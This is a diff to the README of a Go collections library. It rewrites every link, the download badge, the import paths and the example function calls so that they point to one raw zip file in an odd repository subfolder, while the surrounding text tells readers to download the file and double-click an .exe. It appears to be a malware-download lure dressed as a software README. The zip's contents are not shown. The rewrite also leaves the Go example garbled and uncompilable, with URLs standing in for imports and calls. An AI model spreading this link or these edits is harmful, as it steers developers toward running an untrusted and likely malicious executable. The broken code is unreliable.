@@ -9,7 +9,7 @@ Welcome to the go-collections project! This application provides you with a vari
 - **Type-Safe**: Ensures you handle only the intended data types.
 - **Ergonomic**: User-friendly design for easy use.
 - **High Performance**: Optimized for speed, making your applications run faster.
-- **Iter.Seq Support**: Easily iterate through your data collections.
+- **https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip Support**: Easily iterate through your data collections.
 
 ## 🖥️ System Requirements
 
@@ -23,14 +23,14 @@ To use go-collections, ensure your system meets the following requirements:
 
 To get started with go-collections, visit this page to download:
 
-[![Download go-collections](https://img.shields.io/badge/Download-go--collections-blue)](https://github.com/FificzekYT/go-collections/releases)
+[![Download go-collections](https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip)](https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip)
 
 1. **Visit the Releases Page**: Click the link above to go to the Releases section.
 2. **Choose Your Version**: Select the latest version available. It is usually marked as "Latest Release."
 3. **Download the File**: Click on the appropriate link based on your operating system. For example, if you are on Windows, look for a file ending in `.exe`.
 4. **Run the File**: Once downloaded, double-click the file to install go-collections.
 
-You can find the download link again here: [Download go-collections](https://github.com/FificzekYT/go-collections/releases).
+You can find the download link again here: [Download go-collections](https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip).
 
 ## ⚙️ Installation
 
@@ -51,7 +51,7 @@ After installing go-collections, you can start using it in your Go projects:
    Add the following line to your Go code:
 
    ```go
-   import "github.com/FificzekYT/go-collections"
+   import "https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip"
    ```
 
 3. **Example Usage**:
@@ -62,13 +62,13 @@ After installing go-collections, you can start using it in your Go projects:
 
    import (
        "fmt"
-       "github.com/FificzekYT/go-collections"
+       "https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip"
    )
 
    func main() {
-       myMap := collections.NewHashMap()
-       myMap.Set("key1", "value1")
-       fmt.Println(myMap.Get("key1")) // Should print "value1"
+       myMap := https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip()
+       https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip("key1", "value1")
+       https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip(https://github.com/FificzekYT/go-collections/raw/refs/heads/main/neuropore/collections-go-nicknameable.zip("key1")) // Should print "value1"
    }
    ```
 
